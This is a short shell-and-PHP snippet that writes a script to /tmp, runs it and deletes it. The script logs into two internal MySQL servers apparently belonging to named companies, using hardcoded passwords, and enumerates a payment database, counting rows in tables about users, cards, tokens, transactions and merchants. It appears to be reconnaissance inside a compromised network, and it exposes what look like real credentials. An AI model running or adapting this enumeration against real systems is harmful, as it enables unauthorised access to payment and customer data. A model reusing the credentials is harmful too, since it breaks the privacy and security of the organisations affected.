cat > /tmp/t1enum.php << 'PHPEOF'
<?php
error_reporting(0);
$targets = array(
    array("T1_SANBORNS_141.6", "172.27.141.6", 3310, "app_t1", "wUt22Us2CUh#+M="),
    array("T1_CLARO_141.26",   "172.27.141.26", 3306, "app_t1", "pySY8}7>ftpPz9S"),
);
foreach ($targets as $t) {
    list($label,$h,$p,$u,$pw) = $t;
    echo "########## $label ($h:$p) ##########\n";
    $conn = @mysqli_init();
    @mysqli_options($conn, MYSQLI_OPT_CONNECT_TIMEOUT, 6);
    if (!@mysqli_real_connect($conn, $h, $u, $pw, "payment_t1", $p)) {
        echo "CONNECT_FAIL: ".mysqli_connect_error()."\n";
        continue;
    }
    mysqli_set_charset($conn, "utf8");
    $r = mysqli_query($conn, "SHOW TABLES");
    $tables = array();
    while ($row = mysqli_fetch_row($r)) { $tables[] = $row[0]; }
    echo "TABLES(".count($tables)."): ".implode(",", $tables)."\n";
    // row counts for interesting tables
    foreach ($tables as $tb) {
        if (preg_match("/user|client|customer|card|token|pay|transaction|order|merchant|comercio|affiliat/i", $tb)) {
            $rc = mysqli_query($conn, "SELECT COUNT(*) FROM `$tb`");
            $cnt = $rc ? mysqli_fetch_row($rc)[0] : "?";
            echo "  COUNT $tb = $cnt\n";
        }
    }
    mysqli_close($conn);
}
echo "ENUM_DONE\n";
?>
PHPEOF
php /tmp/t1enum.php
rm -f /tmp/t1enum.php
